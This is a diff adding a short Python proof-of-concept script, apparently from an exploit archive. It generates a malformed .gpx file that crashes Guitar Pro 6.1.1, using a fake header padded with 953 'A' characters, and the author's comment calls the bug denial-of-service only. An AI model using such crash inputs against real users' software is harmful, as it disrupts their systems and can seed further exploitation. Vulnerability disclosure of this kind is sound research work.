@@ -1,0 +1,28 @@
+#!/usr/bin/python
+
+# ---------------------------------------------------------
+# Guitar Pro 6.1.1 r10791 (.gpx) Crash POC
+# found by condis
+# 
+# Date      : 01 May 2012 AD
+# Tested on : Windows XP Professional SP3 PL
+#
+# Description :
+#
+# Each load of malformated file into the program ends up 
+# with crash, but place of crash and registers values 
+# differ every time o_O"
+#  
+# In my opinion, this bug does not allow for anything else 
+# except getting to a DoS situation, therefore no further 
+# research was done.
+# ---------------------------------------------------------
+
+evil  = "BCFZ\x04\x10\x01\x00"
+evil += "A" * 953
+
+file = open('ogonek_and_cooh_-_not_my_type.gpx', 'w')
+file.write(evil)
+file.close()
+
+print "Sex, drugs & drum'n'bass!"
